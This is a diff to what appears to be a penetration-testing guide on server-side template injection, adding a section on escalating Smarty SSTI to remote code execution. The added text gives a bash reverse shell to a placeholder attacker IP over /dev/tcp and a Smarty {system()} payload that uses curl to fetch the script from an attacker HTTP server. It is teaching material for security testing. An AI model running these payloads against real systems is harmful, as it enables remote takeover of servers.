@@ -28,7 +28,23 @@ To further confirm and demonstrate impact, we can attempt command execution usin
 ```
 {system("id")}
 ```
-If this returns system user information, it clearly confirms Smarty SSTI with command execution capability.
+If this returns system user information, it clearly confirms Smarty SSTI with command execution capability
+.
+## RCE – Smarty
+
+Create a Bash reverse shell based on the binaries available on the target and save it as shell.sh:
+```
+#!/bin/bash
+
+/bin/bash -i >& /dev/tcp/<attacker-ip>/1234 0>&1
+```
+
+Use curl to download the reverse shell from your Python HTTP server:
+```
+{system('curl http://<attacker-ip>:8000/shell.sh -o /tmp/shell.sh')}
+```
+
+Start the listener on the attacker machine and execute the script to obtain a reverse shell.
 
 ## Node.js – Pug (Jade)
 
